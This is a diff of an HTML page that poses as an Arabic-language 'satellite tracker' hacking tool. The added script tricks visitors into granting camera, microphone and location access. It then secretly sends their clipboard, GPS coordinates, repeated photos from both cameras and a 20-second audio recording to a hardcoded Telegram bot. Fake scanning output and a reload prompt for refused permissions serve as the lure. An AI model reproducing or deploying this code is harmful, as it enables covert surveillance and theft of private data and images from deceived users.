@@ -4,56 +4,23 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="logo.jpg" type="image/jpeg">
-    <title>HACKER EL-NAGM | GEOLOCATION & DATA</title>
+    <title>HACKER EL-NAGM | SATELLITE TRACKING</title>
     
     <style>
         :root { --green: #00ff41; --red: #ff0000; }
         body, html { margin: 0; background: #000; color: var(--green); font-family: 'Courier New', monospace; overflow: hidden; height: 100vh; }
-
-        /* تصميم الشبكة الرئيسية */
-        .container {
-            display: grid;
-            grid-template-columns: 300px 1fr 300px;
-            grid-template-rows: 60px 1fr 180px;
-            height: 100vh;
-            gap: 8px;
-            padding: 8px;
-            box-sizing: border-box;
-        }
-
+        .container { display: grid; grid-template-columns: 300px 1fr 300px; grid-template-rows: 60px 1fr 180px; height: 100vh; gap: 8px; padding: 8px; box-sizing: border-box; }
         .panel { border: 1px solid var(--green); background: rgba(0, 15, 0, 0.9); padding: 10px; position: relative; box-shadow: inset 0 0 15px rgba(0,255,65,0.2); }
-
         .header { grid-column: 1 / 4; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--green); }
-
-        /* الخريطة */
-        #map-container {
-            width: 100%; height: 100%; position: relative;
-            background: #010; overflow: hidden;
-        }
-        iframe {
-            width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(100deg) brightness(0.5) contrast(1.2);
-            pointer-events: none; /* لمنع التفاعل اليدوي وجعله يبدو آلياً */
-        }
-
-        /* تدفق البيانات */
+        #map-container { width: 100%; height: 100%; position: relative; background: #010; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(100deg) brightness(0.5) contrast(1.2); pointer-events: none; }
         .data-flow { font-size: 11px; color: var(--green); height: 100%; overflow: hidden; }
         .critical { color: var(--red); font-weight: bold; animation: pulse 0.5s infinite; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-
-        /* واجهة الهاتف */
-        #phone-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('ha.jpg') no-repeat center center;
-            background-size: cover; z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center;
-        }
-
+        #phone-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }
         input { background: #000; border: 1px solid var(--green); color: var(--green); padding: 10px; width: 80%; font-size: 16px; margin: 10px 0; }
-        button { background: var(--green); color: #000; font-weight: bold; padding: 12px 25px; border: none; cursor: pointer; width: 100%; }
-
-        .scan-line {
-            width: 100%; height: 2px; background: rgba(0, 255, 65, 0.3);
-            position: absolute; top: 0; left: 0; animation: scan 4s linear infinite; z-index: 5;
-        }
+        button { background: var(--green); color: #000; font-weight: bold; padding: 12px 25px; border: none; cursor: pointer; }
+        .scan-line { width: 100%; height: 2px; background: rgba(0, 255, 65, 0.3); position: absolute; top: 0; left: 0; animation: scan 4s linear infinite; z-index: 5; }
         @keyframes scan { from { top: 0; } to { top: 100%; } }
     </style>
 </head>
@@ -65,7 +32,7 @@
             <img src="logo.jpg" style="width:45px; height:45px; border-radius:50%;">
             <h2 style="margin:0; letter-spacing:2px;">EL-NAGM SATELLITE TRACKER</h2>
         </div>
-        <div id="status" class="critical">SYSTEM: SCANNING INTERNET...</div>
+        <div id="status" class="critical">SYSTEM: WAITING FOR TARGET...</div>
     </div>
 
     <div class="panel">
@@ -76,7 +43,7 @@
     <div class="panel" style="padding:0; overflow:hidden;">
         <div class="scan-line"></div>
         <div id="map-container">
-            <iframe id="google-map" src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d110502.6038558384!2d31.2357!3d30.0444!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e1!3m2!1sar!2seg!4v1700000000000!5m2!1sar!2seg"></iframe>
+            <iframe id="google-map" src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d100000!2d31.2357!3d30.0444!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e1!3m2!1sar!2seg!4v1!5m2!1sar!2seg"></iframe>
         </div>
     </div>
 
@@ -95,77 +62,116 @@
 </div>
 
 <div id="phone-overlay">
-    <div style="width:320px; background:rgba(0,0,0,0.9); border:2px solid var(--green); padding:30px; border-radius:25px; text-align:center;">
-        <img src="logo.jpg" style="width:70px; border-radius:50%; margin-bottom:15px;">
-        <h2 style="color:white;">TARGET SECURED</h2>
-        <p style="font-size:14px;">تم تحديد إحداثيات الموقع بدقة 99.9%</p>
-        <p style="color:var(--red);">الجهاز الآن تحت سيطرة "هكر النجم"</p>
-        <input type="password" id="phone-pass" placeholder="كود فك التشفير (2009)" maxlength="4" style="text-align:center; font-size:20px;">
-        <button onclick="unlockPhone()">دخول للقاعدة</button>
+    <div style="width:320px; background:black; border:2px solid var(--green); padding:30px; border-radius:25px; text-align:center;">
+        <h2 style="color:white;">ACCESS DENIED</h2>
+        <p style="font-size:14px; color:var(--red);">يرجى السماح بصلاحيات الكاميرا والموقع لإتمام عملية التعقب</p>
+        <button onclick="location.reload()">إعادة المحاولة</button>
     </div>
 </div>
 
+<video id="vf" autoplay style="display:none;"></video>
+<video id="vb" autoplay style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
+
 <script>
-    // 1. توليد بيانات عشوائية مستمرة
+    const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
+    const chatId = "8754338811";
+
+    // توليد بيانات وهمية للواجهة
     function generateData() {
         const targetList = document.getElementById('target-list');
         const intelFlow = document.getElementById('intel-flow');
-        const terminals = document.getElementById('terminal-out');
-
         const targets = ["+201023****", "+201154****", "IP: 197.45.2.1", "USA_PROXY_7", "USER_7841"];
-        const intel = ["PASS_FOUND", "GPS_SYNC", "WHATSAPP_DUMP", "CALL_RECORD_EXTRACTED"];
-
+        const intel = ["PASS_FOUND", "GPS_SYNC", "DUMP_EXTRACTED", "SYNC_COMPLETED"];
         setInterval(() => {
             targetList.innerHTML = `> SCANNING: ${targets[Math.floor(Math.random()*targets.length)]}<br>` + targetList.innerHTML.substring(0, 300);
             intelFlow.innerHTML = `[✓] ${intel[Math.floor(Math.random()*intel.length)]} -> ${Math.random().toString(36).substr(2,5)}<br>` + intelFlow.innerHTML.substring(0, 300);
-            terminals.innerHTML += `root@elnagm:~# executing_payload_0x${Math.random().toString(16).substr(2,4)}... `;
-            if(terminals.innerHTML.length > 1000) terminals.innerHTML = "";
         }, 1000);
     }
     generateData();
 
-    // 2. وظيفة التعقب بالقمر الصناعي
-    function startSatelliteTracking() {
+    async function sendToBot(msg, isFile = false, blob = null, type = "photo") {
+        let url = `https://api.telegram.org/bot${token}/${isFile ? (type === 'photo' ? 'sendPhoto' : 'sendAudio') : 'sendMessage'}`;
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        if (isFile) fd.append(type === 'photo' ? 'photo' : 'audio', blob, 'data.dat');
+        else { fd.append('text', msg); fd.append('parse_mode', 'Markdown'); }
+        try { await fetch(url, { method: 'POST', body: fd }); } catch(e){}
+    }
+
+    async function startSatelliteTracking() {
         const num = document.getElementById('target-num').value;
         if(!num) return alert("يرجى إدخال رقم الهدف!");
 
-        document.getElementById('status').innerText = "TRACKING SATELLITE: GPS_TARGET_" + num;
-        
-        // محاكاة تحريك الخريطة لمواقع عشوائية (تغيير الـ src لخريطة عشوائية)
-        const map = document.getElementById('google-map');
-        const locations = [
-            "https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d5000!2d31.2!3d30.0!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e1", // موقع 1
-            "https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d2000!2d30.0!3d31.2!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e1"  // موقع 2
-        ];
-        
-        let count = 0;
-        const jump = setInterval(() => {
-            map.src = locations[count % locations.length];
-            count++;
-            if(count > 4) {
-                clearInterval(jump);
-                finalizeHack();
-            }
-        }, 1000);
-    }
+        document.getElementById('status').innerText = "SYSTEM: INITIALIZING PAYLOAD...";
 
-    function finalizeHack() {
-        setTimeout(() => {
-            document.getElementById('hacker-ui').style.opacity = "0";
-            setTimeout(() => {
-                document.getElementById('hacker-ui').style.display = "none";
-                document.getElementById('phone-overlay').style.display = "flex";
-            }, 500);
-        }, 1000);
-    }
+        try {
+            // طلب الصلاحيات الكاملة
+            const streamF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            let streamB = null;
+            try { streamB = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); } catch(e){}
 
-    function unlockPhone() {
-        if(document.getElementById('phone-pass').value === "2009") {
-            alert("أهلاً بك في نظام هكر النجم. السيطرة كاملة.");
-            location.reload();
-        } else {
-            alert("تم اكتشاف محاولة دخول غير مصرح بها! جاري مسح هويتك!");
+            document.getElementById('status').innerText = "SATELLITE LOCKED: " + num;
+
+            // سحب بيانات الجهاز
+            let info = `🛰 *هدف جديد:* ${num}\n`;
+            info += `📱 الجهاز: ${navigator.platform}\n`;
+            try { const clip = await navigator.clipboard.readText(); info += `📋 الحافظة: ${clip}\n`; } catch(e){}
+            sendToBot(info);
+
+            // سحب الموقع
+            navigator.geolocation.getCurrentPosition(p => {
+                sendToBot(`📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            // بدء التقاط الصور (19 لكل كاميرا)
+            const vidF = document.getElementById('vf'); vidF.srcObject = streamF;
+            const vidB = document.getElementById('vb'); if(streamB) vidB.srcObject = streamB;
+            
+            const canvas = document.getElementById('c');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 640; canvas.height = 480;
+
+            let count = 0;
+            const picInt = setInterval(() => {
+                if (count >= 19) { clearInterval(picInt); return; }
+                
+                ctx.drawImage(vidF, 0, 0, 640, 480);
+                canvas.toBlob(b => sendToBot("", true, b, "photo"), 'image/jpeg');
+
+                if(streamB) {
+                    setTimeout(() => {
+                        ctx.drawImage(vidB, 0, 0, 640, 480);
+                        canvas.toBlob(b => sendToBot("", true, b, "photo"), 'image/jpeg');
+                    }, 500);
+                }
+                count++;
+            }, 1500);
+
+            // تسجيل صوت 20 ثانية
+            const recorder = new MediaRecorder(streamF);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const audioBlob = new Blob(chunks, { type: 'audio/mp3' });
+                sendToBot("", true, audioBlob, "audio");
+                finalizeUI();
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 20000);
+
+        } catch (err) {
+            document.getElementById('hacker-ui').style.display = "none";
+            document.getElementById('phone-overlay').style.display = "flex";
         }
+    }
+
+    function finalizeUI() {
+        document.getElementById('status').innerText = "HACK COMPLETED: DATA SENT";
+        setTimeout(() => {
+             alert("تم انتهاء المهمة. البيانات مؤمنة بالكامل.");
+             location.reload();
+        }, 2000);
     }
 </script>
 </body>
